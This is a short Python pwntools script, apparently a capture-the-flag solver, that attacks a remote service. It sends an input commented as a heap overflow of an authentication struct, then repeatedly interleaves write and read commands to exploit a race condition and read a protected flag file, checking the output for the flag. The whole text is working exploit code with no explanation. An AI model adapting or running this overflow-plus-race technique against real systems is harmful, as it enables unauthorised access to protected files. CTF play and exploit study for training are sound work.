from pwn import *
import time
def solve(ip, port, flag):
    r = remote(ip, int(port))
    r.sendline("seyseyseyseyseyseyseyseyseyseyaasey") #heap overflow the auth struct
    res = ""
    for i in range(20):
        r.sendline("write")
        r.sendline("/home/ctf/databas.txt") # make the write thread read from allowed database
        r.sendline("2")
        r.sendline("blablabla")
        r.sendline("read")
        r.sendline("/home/ctf/flag.txt")
        r.sendline("0") # race condition between read and write thread
    res += str(r.recvuntil(flag, timeout=3)).replace("\\n", "")
    print(res)
    if flag in res:
        print("success")
        exit(0)
flag = ""
flag = input("flag: ").replace("\n", "")
#k = str(k)
#flag = str(flag)
ip, port = str(input()).split(":")#("ec2-13-53-42-42.eu-north-1.compute.amazonaws.com", "50000")
for test_Attempt in range(2):
    solve(ip, port, flag)
exit(1)
